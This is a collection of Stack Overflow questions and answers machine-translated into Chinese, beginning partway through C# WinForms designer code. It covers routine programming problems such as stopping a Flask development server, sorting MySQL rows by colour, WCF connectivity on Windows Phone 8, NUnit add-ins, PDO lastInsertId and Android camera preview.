    this.btnRemoveSingle.Click += new System.EventHandler(this.btnRemoveSingle_Click);
    // 
    // btnAddAll
    // 
    this.btnAddAll.Location = new System.Drawing.Point(216, 96);
    this.btnAddAll.Name = "btnAddAll";
    this.btnAddAll.Size = new System.Drawing.Size(30, 23);
    this.btnAddAll.TabIndex = 12;
    this.btnAddAll.Text = ">>";
    this.btnAddAll.UseVisualStyleBackColor = true;
    this.btnAddAll.Click += new System.EventHandler(this.btnAddAll_Click);
    // 
    // btnAddSingle
    // 
    this.btnAddSingle.Location = new System.Drawing.Point(216, 67);
    this.btnAddSingle.Name = "btnAddSingle";
    this.btnAddSingle.Size = new System.Drawing.Size(30, 23);
    this.btnAddSingle.TabIndex = 11;
    this.btnAddSingle.Text = ">";
    this.btnAddSingle.UseVisualStyleBackColor = true;
    this.btnAddSingle.Click += new System.EventHandler(this.btnAddSingle_Click);
    // 
    // btnConfirm
    // 
    this.btnConfirm.Location = new System.Drawing.Point(269, 302);
    this.btnConfirm.Name = "btnConfirm";
    this.btnConfirm.Size = new System.Drawing.Size(75, 23);
    this.btnConfirm.TabIndex = 8;
    this.btnConfirm.Text = "确定";
    this.btnConfirm.UseVisualStyleBackColor = true;
    this.btnConfirm.Click += new System.EventHandler(this.btnConfirm_Click);
    // 
    // label1
    // 
    this.label1.Location = new System.Drawing.Point(15, 9);
    this.label1.Name = "label1";
    this.label1.Size = new System.Drawing.Size(92, 16);
    this.label1.TabIndex = 16;
    this.label1.Text = "周转箱列表：";
    // 
    // label2
    // 
    this.label2.Location = new System.Drawing.Point(267, 9);
    this.label2.Name = "label2";
    this.label2.Size = new System.Drawing.Size(92, 16);
    this.label2.TabIndex = 17;
    this.label2.Text = "已选择周转箱：";
    // 
    // lvSelectBoxes
    // 
    this.lvSelectBoxes.CheckBoxes = true;
    this.lvSelectBoxes.Location = new System.Drawing.Point(269, 44);
    this.lvSelectBoxes.Name = "lvSelectBoxes";
    this.lvSelectBoxes.Size = new System.Drawing.Size(180, 228);
    this.lvSelectBoxes.TabIndex = 18;
    this.lvSelectBoxes.UseCompatibleStateImageBehavior = false;
    this.lvSelectBoxes.View = System.Windows.Forms.View.List;
    // 
    // lvBox
    // 
    this.lvBox.Location = new System.Drawing.Point(12, 28);
    this.lvBox.Name = "lvBox";
    this.lvBox.Size = new System.Drawing.Size(180, 244);
    this.lvBox.TabIndex = 19;
    this.lvBox.UseCompatibleStateImageBehavior = false;
    this.lvBox.View = System.Windows.Forms.View.List;
    // 
    // label3
    // 
    this.label3.AutoSize = true;
    this.label3.ForeColor = System.Drawing.Color.Red;
    this.label3.Location = new System.Drawing.Point(267, 25);
    this.label3.Name = "label3";
    this.label3.Size = new System.Drawing.Size(221, 12);
    this.label3.TabIndex = 20;
    this.label3.Text = "注：选中复选框表示此箱已满，不可再用";
    // 
    // groupBox1
    // 
    this.groupBox1.Controls.Add(this.txtBoxNoChk);
    this.groupBox1.Controls.Add(this.lblBoxNoS);
    this.groupBox1.Location = new System.Drawing.Point(12, 279);
    this.groupBox1.Name = "groupBox1";
    this.groupBox1.Size = new System.Drawing.Size(180, 44);
    this.groupBox1.TabIndex = 21;
    this.groupBox1.TabStop = false;
    this.groupBox1.Text = "筛选箱号：";
    // 
    // txtBoxNoChk
    // 
    this.txtBoxNoChk.Location = new System.Drawing.Point(78, 16);
    this.txtBoxNoChk.MaxLength = 5;
    this.txtBoxNoChk.Name = "txtBoxNoChk";
    this.txtBoxNoChk.Size = new System.Drawing.Size(95, 21);
    this.txtBoxNoChk.TabIndex = 1;
    this.txtBoxNoChk.TextChanged += new System.EventHandler(this.txtBoxNoChk_TextChanged);
    // 
    // lblBoxNoS
    // 
    this.lblBoxNoS.AutoSize = true;
    this.lblBoxNoS.Location = new System.Drawing.Point(7, 23);
    this.lblBoxNoS.Name = "lblBoxNoS";
    this.lblBoxNoS.Size = new System.Drawing.Size(65, 12);
    this.lblBoxNoS.TabIndex = 0;
    this.lblBoxNoS.Text = "匹配箱号：";
    // 
    // frmChooseBoxes
    // 
    this.ClientSize = new System.Drawing.Size(492, 346);
    this.Controls.Add(this.groupBox1);
    this.Controls.Add(this.label3);
    this.Controls.Add(this.lvBox);
    this.Controls.Add(this.lvSelectBoxes);
    this.Controls.Add(this.label2);
    this.Controls.Add(this.label1);
    this.Controls.Add(this.btnExit);
    this.Controls.Add(this.btnRemoveAll);
    this.Controls.Add(this.btnRemoveSingle);
    this.Controls.Add(this.btnAddAll);
    this.Controls.Add(this.btnAddSingle);
    this.Controls.Add(this.btnConfirm);
    this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
    this.Name = "frmChooseBoxes";
    this.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
    this.Text = "选择箱号";
    this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.frmChooseBoxes_FormClosing);
    this.Load += new System.EventHandler(this.frmChooseBoxes_Load);
    this.groupBox1.ResumeLayout(false);
    this.groupBox1.PerformLayout();
    this.ResumeLayout(false);
    this.PerformLayout();

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:28:29.543

好的，伙计们，我终于找到了答案，它是导致问题的 DotNetSkin.dll。当我推荐与之相关的所有代码时，它在win7或server2003中无法正常工作。应用程序运行良好。不管怎么说，还是要谢谢你 ：）

# python - 如何在不使用 ctrl-c 的情况下停止烧瓶应用程序

> ID：15562446
> 
> 赞同：151
> 
> 时间：2013-03-22T03:55:25.783
> 
> 标签：python, flask, flask-extensions

我想实现一个可以通过使用烧瓶脚本停止烧瓶应用程序的命令。我已经搜索了一段时间的解决方案。因为该框架不提供`app.stop()`API，所以我很好奇如何编写代码。我正在开发 Ubuntu 12.10 和 Python 2.7.3。

* * *

## 回答 #1

> 赞同：179
> 
> 时间：2013-06-11T20:47:13.663

如果您只是在桌面上运行服务器，您可以公开一个端点来终止服务器（在[Shutdown The Simple Server](http://web.archive.org/web/20190706125149/http://flask.pocoo.org/snippets/67)阅读更多内容）：

```
from flask import request
def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()

@app.get('/shutdown')
def shutdown():
    shutdown_server()
    return 'Server shutting down...' 
```

这是另一种包含更多内容的方法：

```
from multiprocessing import Process

server = Process(target=app.run)
server.start()
# ...
server.terminate()
server.join() 
```

让我知道这是否有帮助。

* * *

## 回答 #2

> 赞同：58
> 
> 时间：2017-07-10T16:53:38.340

我使用线程做的略有不同

```
from werkzeug.serving import make_server

class ServerThread(threading.Thread):

    def __init__(self, app):
        threading.Thread.__init__(self)
        self.server = make_server('127.0.0.1', 5000, app)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        log.info('starting server')
        self.server.serve_forever()

    def shutdown(self):
        self.server.shutdown()

def start_server():
    global server
    app = flask.Flask('myapp')
    ...
    server = ServerThread(app)
    server.start()
    log.info('server started')

def stop_server():
    global server
    server.shutdown() 
```

我用它来对restful api进行端到端测试，我可以使用python请求库发送请求。

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2018-07-23T01:54:38.377

这是一个有点老的线程，但如果有人在试验、学习或测试基本的烧瓶应用程序，从在后台运行的脚本开始，停止它的最快方法是终止在您运行应用程序的端口上运行的进程在。注意：我知道作者正在寻找一种不杀死或停止应用程序的方法。但这可能对正在学习的人有所帮助。

```
sudo netstat -tulnp | grep :5001 
```

你会得到这样的东西。

> tcp 0 0 0.0.0.0:5001 0.0.0.0:* LISTEN 28834/python

要停止应用程序，请终止该进程

```
sudo kill 28834 
```

* * *

## 回答 #4

> 赞同：20
> 
> 时间：2016-08-19T06:57:29.413

我的方法可以通过 bash 终端/控制台进行

1）运行并获取进程号

```
$ ps aux | grep yourAppKeywords 
```

2a) 终止进程

```
$ kill processNum 
```

2b）如果以上不起作用，则终止该进程

```
$ kill -9 processNum 
```

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2014-11-06T19:59:15.707

正如其他人指出的那样，您只能`werkzeug.server.shutdown`从请求处理程序中使用。我发现在其他时间关闭服务器的唯一方法是向自己发送请求。例如，`/kill`此代码段中的处理程序将终止开发服务器，除非下一秒有另一个请求进入：

```
import requests
from threading import Timer
from flask import request
import time

LAST_REQUEST_MS = 0
@app.before_request
def update_last_request_ms():
    global LAST_REQUEST_MS
    LAST_REQUEST_MS = time.time() * 1000

@app.post('/seriouslykill')
def seriouslykill():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        raise RuntimeError('Not running with the Werkzeug Server')
    func()
    return "Shutting down..."

@app.post('/kill')
def kill():
    last_ms = LAST_REQUEST_MS
    def shutdown():
        if LAST_REQUEST_MS <= last_ms:  # subsequent requests abort shutdown
            requests.post('http://localhost:5000/seriouslykill')
        else:
            pass

    Timer(1.0, shutdown).start()  # wait 1 second
    return "Shutting down..." 
```

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2017-03-09T15:52:31.577

这是一个古老的问题，但谷歌搜索并没有让我了解如何实现这一点。

因为我没有正确阅读[这里的代码](http://flask.pocoo.org/snippets/67/)！（Doh！）它的作用`RuntimeError`是`werkzeug.server.shutdown`在`request.environ`...

所以当没有的时候我们能做的`request`就是提高一个`RuntimeError`

```
def shutdown():
    raise RuntimeError("Server going down") 
```

`app.run()`并在返回时抓住它：

```
...
try:
    app.run(host="0.0.0.0")
except RuntimeError, msg:
    if str(msg) == "Server going down":
        pass # or whatever you want to do when the server goes down
    else:
        # appropriate handling/logging of other runtime errors
# and so on
... 
```

无需向自己发送请求。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2020-01-15T16:26:51.657

如果您正在使用 CLI 并且只有一个烧瓶应用程序/进程正在运行（或者更确切地说，您只想终止系统上运行的*任何*烧瓶进程），您可以使用以下命令终止它：

`kill $(pgrep -f flask)`

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2020-06-11T10:47:32.160

如果您不在请求-响应处理范围内，您仍然可以：

```
import os
import signal

sig = getattr(signal, "SIGKILL", signal.SIGTERM)
os.kill(os.getpid(), sig) 
```

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2020-02-06T09:54:27.547

您不必按`CTRL`+ `C`，但您可以提供一个端点来为您执行此操作：

```
from flask import Flask, jsonify, request
import json, os, signal

@app.route('/stopServer', methods=['GET'])
def stopServer():
    os.kill(os.getpid(), signal.SIGINT)
    return jsonify({ "success": True, "message": "Server is shutting down..." }) 
```

现在你可以调用这个端点来优雅地关闭服务器：

```
curl localhost:5000/stopServer 
```

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2020-09-23T08:27:14.577

如果其他人正在寻找如何在**win32 服务**中停止 Flask 服务器- 就在这里。这是几种方法的奇怪组合，但效果很好。关键思想：

1.  这些是`shutdown`可用于优雅关闭的端点。*注意*：它依赖于哪个**仅**`request.environ.get`在 Web 请求的上下文中可用（内部-ed 函数）**`@app.route`**
***   win32service 的`SvcStop`方法用于`requests`对服务本身进行 HTTP 请求。**

 ****myservice_svc.py**

```
import win32service
import win32serviceutil
import win32event
import servicemanager
import time
import traceback
import os

import myservice

class MyServiceSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyServiceSvc"                       # NET START/STOP the service by the following name
    _svc_display_name_ = "Display name"  # this text shows up as the service name in the SCM
    _svc_description_ = "Description" # this text shows up as the description in the SCM

    def __init__(self, args):
        os.chdir(os.path.dirname(myservice.__file__))
        win32serviceutil.ServiceFramework.__init__(self, args)

    def SvcDoRun(self):
        # ... some code skipped
        myservice.start()

    def SvcStop(self):
        """Called when we're being shut down"""
        myservice.stop()
        # tell the SCM we're shutting down
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STOPPED,
                              (self._svc_name_, ''))

if __name__ == '__main__':
    os.chdir(os.path.dirname(myservice.__file__))
    win32serviceutil.HandleCommandLine(MyServiceSvc) 
```

**我的服务.py**

```
from flask import Flask, request, jsonify

# Workaround - otherwise doesn't work in windows service.
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask('MyService')

# ... business logic endpoints are skipped.

@app.route("/shutdown", methods=['GET'])
def shutdown():
    shutdown_func = request.environ.get('werkzeug.server.shutdown')
    if shutdown_func is None:
        raise RuntimeError('Not running werkzeug')
    shutdown_func()
    return "Shutting down..."

def start():
    app.run(host='0.0.0.0', threaded=True, port=5001)

def stop():
    import requests
    resp = requests.get('http://0.0.0.0:5001/shutdown') 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2019-08-21T14:24:54.390

您可以使用下面的方法

```
app.do_teardown_appcontext() 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2021-11-02T15:30:41.760

`request.environ.get` [已弃用](https://github.com/microsoft/debugpy/issues/628#issuecomment-848237040)。 [Pavel Minaev](https://github.com/int19h)的解决方案非常清楚：

```
import os
from flask import Flask

app = Flask(__name__)
exiting = False

@app.route("/exit")
def exit_app():
    global exiting
    exiting = True
    return "Done"

@app.teardown_request
def teardown(exception):
    if exiting:
        os._exit(0) 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2020-08-11T00:48:12.523

# 谷歌云虚拟机实例 + Flask 应用

我在谷歌云平台虚拟机上托管了我的 Flask 应用程序。我使用启动应用程序`python main.py`但问题是 ctrl+c 无法停止服务器。

此命令`$ sudo netstat -tulnp | grep :5000`终止服务器。

默认情况下，我的 Flask 应用程序在端口 5000 上运行。

## 注意：我的 VM 实例在 Linux 9 上运行。

它适用于此。其他平台没有测试。如果它也适用于其他版本，请随时更新或评论。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2020-11-04T20:15:51.643

## 一个 Python 解决方案

运行： `python kill_server.py`。

这仅适用于**Windows**。通过 PID 和 netstat 收集的 taskkill 杀死服务器。

```
# kill_server.py

import os
import subprocess
import re

port = 5000
host = '127.0.0.1'
cmd_newlines = r'\r\n'

host_port = host + ':' + str(port)
pid_regex = re.compile(r'[0-9]+$')

netstat = subprocess.run(['netstat', '-n', '-a', '-o'], stdout=subprocess.PIPE)  
# Doesn't return correct PID info without precisely these flags
netstat = str(netstat)
lines = netstat.split(cmd_newlines)

for line in lines:
    if host_port in line:
        pid = pid_regex.findall(line)
        if pid:
            pid = pid[0]
            os.system('taskkill /F /PID ' + str(pid))

# And finally delete the .pyc cache
os.system('del /S *.pyc') 
```

如果您在加载 favicon / 更改 index.html 时遇到问题（即缓存旧版本），那么也可以**在 Chrome 中尝试“清除浏览数据 > 图像和文件”**。

完成上述所有操作后，我终于在运行 Flask 应用程序时加载了我的图标。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2022-01-05T22:07:58.503

```
app = MyFlaskSubclass()

...

app.httpd = MyWSGIServerSubclass()

...

@app.route('/shutdown')
def app_shutdown():
    from threading import Timer
    t = Timer(5, app.httpd.shutdown)
    t.start()
    return "Server shut down" 
```

* * *

## 回答 #16

> 赞同：-6
> 
> 时间：2019-06-21T20:27:08.727

对于 Windows，停止/杀死烧瓶服务器非常容易 -

1.  转到任务管理器
2.  找到烧瓶.exe
3.  选择并结束进程**

# php - MySQL - 按多个关键字排序

> ID：15562447
> 
> 赞同：-3
> 
> 时间：2013-03-22T03:55:46.323
> 
> 标签：php, mysql, e-commerce

为本地企业编写电子商务。把这一切都整理好了，只是解决问题。

现在他们有很多相同的产品，只是颜色不同。所以我需要一些帮助来按所说的颜色排序。它们由以下命名。

[厂家] - [颜色] - [系列]

示例：Art Spectrum - **Primrose Yellow** - 系列 1

我需要它们按**黄色**分类，但有时它们没有某种颜色。就像只是黄色，而不是月见草黄。此外，数据库中有多种颜色 - 红色、绿色、蓝色等，并且都有变体。

无论如何，我将如何排序？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:19:50.473

如果我理解正确你可以试试

```
SELECT *
  FROM products
 ORDER BY TRIM(SUBSTRING_INDEX(SUBSTRING_INDEX(prod_name, '-', 2),'-', -1) 
```

*这显然会让您仅按颜色名称的完全匹配进行排序*

**[SQLFiddle](http://sqlfiddle.com/#!2/95a4a/10)**

**UPDATE**现在，您可以轻松创建这样的颜色匹配表

```
CREATE TABLE colors
    (`color` varchar(64), `color2` varchar(64))
; 
```

用匹配的颜色填充它

```
|           COLOR | COLOR2 |
----------------------------
| Primrose Yellow | Yellow | 
```

您最初可以`color`使用这样的查询填充此表中的字段

```
INSERT INTO colors (color)
SELECT TRIM(SUBSTRING_INDEX(SUBSTRING_INDEX(prod_name, '-', 2),'-', -1))
  FROM products 
```

然后你可以使用这个查询来做你想做的事

```
SELECT p.*
FROM products p LEFT JOIN
     colors c ON TRIM(SUBSTRING_INDEX(SUBSTRING_INDEX(p.prod_name, '-', 2),'-', -1)) = c.color
ORDER BY COALESCE(c.color2, TRIM(SUBSTRING_INDEX(SUBSTRING_INDEX(p.prod_name, '-', 2),'-', -1))) 
```

*如果颜色匹配表结果集中没有特定颜色的条目，则无论如何都会根据在产品名称中找到的实际颜色值进行排序，*这意味着您可以逐渐填充它。

输出

```
| ID |                                 PROD_NAME |
--------------------------------------------------
|  2 |                    Art 2 - Red - Series 1 |
|  1 | Art Spectrum - Primrose Yellow - Series 1 |
|  3 |         Art Spectrum2 - Yellow - Series 2 | 
```

**[SQLFiddle](http://sqlfiddle.com/#!2/a9a30/1)**为此

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:03:15.003

我认为您需要在`Full TEXT`这里使用索引搜索。

但仅表支持全文搜索`MyISAM`。

将`FULLTEXT`索引添加到您的列，然后使用以下查询：

**询问：**

```
SELECT * FROM table_name
WHERE MATCH (column_name)
AGAINST ('Yellow' IN BOOLEAN MODE) 
```

# .net - WCF 的 Windows Phone 8 错误 - 远程服务器返回错误：未找到

> ID：15562451
> 
> 赞同：2
> 
> 时间：2013-03-22T03:56:09.170
> 
> 标签：.net, wcf, windows-phone-8, wcf-binding

我不太确定从哪里开始！！这个问题一直让我发疯！

我正在尝试开发一个使用的应用程序`Windows Phone 8`，`WCF`虽然它可以正常工作，但我确实说好的，因为我经常遇到我现在遇到的相同的通信错误，当我停止我的网络时它最终会回来适配器并重新启动它们，但我必须这样做几次。

发生了一些事情，我仍然不知道是什么，但我的模拟器完全停止工作，它只会挂起，我会收到各种错误。我卸载了 sdk 8，hyper-v 几次，但仍然出现错误。然后我再次卸载该批次并删除了所有 hyper-v 文件夹、配置等......虽然我不确定我是如何修复它的，但当我`Emulator WVGA 512MB`从`Emulator 720P`. 然后我换回来，不知何故它又开始工作了……没有意义！我知道！

无论如何，由于我的模拟器已备份，我只是无法让我的应用程序与从我的桌面运行的 wcf 服务进行通信。我不断收到以下错误：

```
{System.Net.WebException: The remote server returned an error: NotFound. ---> System.Net.WebException: The remote server returned an error: NotFound.
    at System.Net.Browser.ClientHttpWebRequest.InternalEndGetResponse(IAsyncResult asyncResult)
    at System.Net.Browser.ClientHttpWebRequest.<>c__DisplayClasse.<EndGetResponse>b__d(Object sendState)
    at System.Net.Browser.AsyncHelper.<>c__DisplayClass1.<BeginOnUI>b__0(Object sendState)
    --- End of inner exception stack trace ---
    at System.Net.Browser.AsyncHelper.BeginOnUI(SendOrPostCallback beginMethod, Object state)
    at System.Net.Browser.ClientHttpWebRequest.EndGetResponse(IAsyncResult asyncResult)
    at System.ServiceModel.Channels.HttpChannelFactory.HttpRequestChannel.HttpChannelAsyncRequest.CompleteGetResponse(IAsyncResult result)} 
```

所以研究了错误“远程服务器返回错误：NotFound”，发现了很多文章，几乎尝试了所有建议的方法，但仍然没有运气！

这是 Microsoft 的一篇具体文章：http: [//msdn.microsoft.com/en-us/library/windowsphone/develop/jj684580%28v=vs.105%29.aspx](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj684580%28v=vs.105%29.aspx)

虽然我还没有尝试过 IIS 解决方案，因为我才刚刚开始开发我的 wcf 服务，但我已经尝试过 IIS Express，但什么也没有！正如我之前所说的那样使用它来工作！

让我抓狂的是：

1.  我可以在我的网络浏览器中访问 .svc 或通过 Http Activation

2.  我可以在模拟器中访问路由器的网站

3.  我可以在模拟器中访问互联网

所以它肯定能够访问并与其他设备通信，但它不会访问我的 wcf 服务。

在我发现的另一篇文章中（没有链接，但稍后会查找），它建议在`applicationhost.config`位于的位置添加第二个绑定`%userprofile%\Documents\IISExpress\config\`，当我这样做时，我收到一个错误，基本上告诉我我不允许有 2 个绑定，除非我`multipleSiteBindingsEnabled`设置为 true 并且它解决了这个问题，但是即使在使用我的完整 IP 地址而不是 localhost 引入第二个绑定并将我的服务更改为使用具有完整 IP 地址的 .svc 之后，仍然没有任何变化...同样的错误。

我不相信我会遇到任何错误，因为我在方法的开头有一个断点，并且它没有执行任何相关代码，所以（我认为）假设就是这样是公平的甚至没有到达那里！我只是不明白为什么它曾经工作过，现在突然停止了！显然与我的模拟器有关，让我开始悲伤但仍然​​没有解决方案！！！

有没有人有任何建议？我完全处于静止状态，不知道下一步该去哪里！！！极度沮丧！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-24T02:08:11.887

我弄清楚了问题所在！

我非常习惯在自己的机器上使用特定的防病毒/防火墙软件工作，但我使用的机器是测试机器，它使用标准的 Windows 防火墙！！

这就是问题！好吧，部分。不知何故，如果我关闭 Windows 防火墙服务，它仍然不会让我连接，但如果我打开防火墙并告诉它不要监视私有网络，它会立即工作！

我仍然不知道它最初是如何工作的，因为防火墙会一直打开，专用网络的监控也会如此，但不知何故它现在正在工作，所以我不得不假设这是问题所在。

阅读此内容以获取有关如何根据您的场景进行设置的更多信息：

[http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj684580%28v=vs.105%29.aspx](http://msdn.microsoft.com/en-us/library/windowsphone/develop/jj684580%28v=vs.105%29.aspx)

就个人而言，我决定使用机器名称而不是 IP，因为我经常根据我连接到的网络为我的机器分配新 IP，但只是为私有和域网络添加了一个特定端口，从而确保我总是可以访问我的 wcf 服务。

希望这可以帮助。

# nunit - NUnit 我的扩展没有加载

> ID：15562456
> 
> 赞同：1
> 
> 时间：2013-03-22T03:56:18.723
> 
> 标签：nunit

我为 NUnit 2.6.2 编写了一个扩展。

我安装了一个监听器

```
namespace NUnit.EventExtension
{

[NUnitAddin(Type = ExtensionType.Core)]
public class NUnitExtension : IAddin
{
    public bool Install(IExtensionHost host)
    {
        IExtensionPoint listeners = host.GetExtensionPoint("EventListeners");
        listeners.Install(new AttrHooksEventListener());
        return true;
    }
}
} 
```

当我向控制台输出一些文本时，AttrHooksEventListener 是一个简单的类。项目建设成功。我将我的 dll 文件复制到 bin\addins 路径。但是我的扩展程序没有显示在扩展程序列表中并且不起作用。

PS 我尝试使用其他一些示例扩展，其中任何一个都不起作用。

为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T20:00:30.927

我找到了解决方案。

我将目标 .NET 框架版本从 v4.0 更改为 v3.5。

# c# - 如何强制 2 个 C# 方法在编译时总是一起出现？

> ID：15562470
> 
> 赞同：0
> 
> 时间：2013-03-22T03:57:41.040
> 
> 标签：c#, .net, compiler-construction

我有两个 C# 方法 RegisterTasks() 和 WaitForAll()，每当调用 RegisterTasks() 时，也必须在同一个代码块中调用 WaitForAll()。只是想知道是否有办法告诉 C# 编译器确保 WaitForAll() 总是与 RegisterTasks() 一起出现，否则会给出编译错误？谢谢~

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T03:59:32.607

降低 and 的可见性`RegisterTasks()`，`WaitForAll()`并公开一个调用它们的方法。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T04:01:51.110

正如其他人所说，简短的回答是否定的。

我假设这些方法是分开的，因为调用者可能希望在它们之间执行其他代码。您可能希望考虑创建一个组合方法，该方法将委托作为参数，然后在需要时调用该委托。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:58:37.217

不可以。您需要正确记录合同并相信最终用户会正确使用这些方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T04:01:56.413

不，但你可以做一些设计。例子：

```
public void RegisterTasks(){
  // do something
  WaitForAll();
} 
```

或者

```
public void RegisterTasks(){
  // do something
  privateWaitForAll();
}
public void WaitForAll(){
  // do something
  privateWaitForAll();
}
private void privateWaitForAll(){
  // do something
} 
```

# sql - 使用 GROUP BY 编写 SQL 语句以实现每个“组”的单行的正确方法是什么？

> ID：15562472
> 
> 赞同：1
> 
> 时间：2013-03-22T03:57:51.650
> 
> 标签：sql, group-by

给定 MS SQL 中的以下表结构：

数据：

```
ID-----+EventDate-------------------+IP--------------+Count
1       2013-03-20 21:15:22.113 192.168.1.1      False
4       2013-03-21 21:15:22.113 192.168.1.1      True
5       2013-03-19 21:15:22.113 192.168.1.1      True
6       2013-03-19 21:15:22.113 192.168.1.1      False
7       2013-03-21 21:15:22.113 192.168.1.1      True
8       2013-03-19 21:15:22.113 192.168.1.1      True 
```

我想编写一个查询，为每个唯一的 IP 地址返回一行，最低日期的第一个实例为“MinDate”，日期的最后一个实例（最近）为最大日期，计数为“ TRUE" 忽略错误计数记录。

谷歌搜索分组，并假设使用 min() 和 max() 作为日期表达式是正确的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:01:09.007

我认为这应该使用`GROUP BY`IP工作。

```
SELECT COUNT(1) cnt,
   MIN(EventDate) MinEventDate,
   MAX(EventDate) MaxEventDate,
   IP
FROM YourTable
WHERE Count = 'True'
GROUP BY IP 
```

您正在使用哪个 RDBMS -`COUNT`作为列名可能会被保留。

[SQL 小提琴演示](http://sqlfiddle.com/#!3/984ea/1)

# php - 使用过程插入行时，PHP MYSQL PDO lastInsertId 返回 0

> ID：15562478
> 
> 赞同：0
> 
> 时间：2013-03-22T03:58:23.637
> 
> 标签：php, mysql, pdo, last-insert-id

我的 LastInsertedID 一直为零，我认为这是因为我使用的是 mysql 存储过程。这是我的代码：

```
// Set up a new MYSQL PDO Database Connection
$dbConnection = new PDO('mysql:host=localhost;dbname=database;charset=UTF8', 'username', 'password');
//turn off emulation for prepared statement and set error mode option
$dbConnection->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$dbConnection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

//Create a statement and prepare it with parameters
$stmt = $dbConnection->prepare("CALL AddMovieSet(:UserID, :SelectedLibraryID, :txtName, :txtNotes);");
$stmt->bindValue(':UserID', $_SESSION["UserID"], PDO::PARAM_STR);
$stmt->bindValue(':SelectedLibraryID', $_SESSION["SelectedLibraryID"], PDO::PARAM_STR);
$stmt->bindValue(':txtName', $_GET["txtName"], PDO::PARAM_STR);
$stmt->bindValue(':txtNotes', $_GET["txtNotes"], PDO::PARAM_STR);
//execute the prepared statement
$stmt->execute();

//the stored procedure successfully inserts a row
$Name=$_GET["txtName"];
$Notes=$_GET["txtNotes"];
$InsertedID=$dbConnection->lastInsertId(); 
//$InsertedID is always zero, the table I am inserting a row into has an AUTO_INCREMENT for the first column. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T04:04:30.553

有时 PHP 和 PDO 可能会出现错误`lastInsertID()`和存储过程。尝试改用这个 MySQL 调用：

```
"SELECT LAST_INSERT_ID();" 
```

# python - 如何安装 libsandbox？我在安装过程中遇到了一些问题

> ID：15562479
> 
> 赞同：-1
> 
> 时间：2013-03-22T03:58:34.737
> 
> 标签：python, linux, sandbox, python-c-extension, pysandbox

我在安装[libsandbox](http://openjudge.net/~liuyu/Project/LibSandbox)和 pysandbox 时遇到了一些问题。我尝试过使用二进制和源代码包，但没有。似乎没问题，但是当我运行时：

```
from sandbox import * 
```

它显示

```
Traceback (most recent call last):
File "<stdin>", line 1, in <module>
File "/usr/local/lib/python2.7/dist-packages/sandbox/__init__.py", line 57, in <module>
from . import _sandbox
ImportError: /usr/local/lib/python2.7/dist-packages/sandbox/_sandbox.so: wrong ELF class: ELFCLASS32 
```

我怎样才能让它工作？我在 Linux 64 位上运行。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-26T08:07:51.493

好像您已经在 64 位机器上安装了 32 位 pysandbox，并尝试从 64 位 python 解释器导入 32 位模块。

免责声明：我是`libsandbox`.

# android - setPreviewDisplay 和 setDisplayOrientation

> ID：15562481
> 
> 赞同：9
> 
> 时间：2013-03-22T03:58:38.357
> 
> 标签：android, android-camera

我对 OpenCV 的 Android 相机示例代码感到困惑。他们创建了一个自定义类，该类实现`SurfaceHolder.Callback`并将以下行放入方法中`surfaceChanged`：

```
mCamera.setPreviewDisplay(null); 
```

`setPreviewDisplay`用于解释的 Android 文档：

> 此方法必须在 startPreview() 之前调用。一个例外是，如果在调用 startPreview() 之前未设置预览表面（或设置为 null），则可以使用非 null 参数调用此方法一次以设置预览表面。（这允许相机设置和表面创建并行发生，节省时间。）预览表面可能不会在预览运行时更改。

不同寻常的是，OpenCV 的代码从不`setPreviewDisplay`使用非空 SurfaceHolder 进行调用。它工作正常，但使用更改图像的旋转`setDisplayOrientation`不起作用。这条线似乎也没有做任何事情，因为没有它我会得到相同的结果。

如果我`setPreviewDisplay`使用提供给`surfaceChanged`而不是SurfaceHolder 进行调用`null`，则图像会旋转，但不包括图像处理的结果。稍后我也会收到一个`IllegalArgumentException`电话`lockCanvas`。

这是怎么回事？

以下是他们代码中（可能）最相关的部分，稍微简化并内联了方法。这是[完整版](http://codepad.org/p9O3JcNK)。

**类定义**

```
public abstract class SampleViewBase extends SurfaceView 
    implements SurfaceHolder.Callback, Runnable { 
```

**打开相机时**

```
mCamera.setPreviewCallbackWithBuffer(new PreviewCallback() {
    public void onPreviewFrame(byte[] data, Camera camera) {
        synchronized (SampleViewBase.this) {
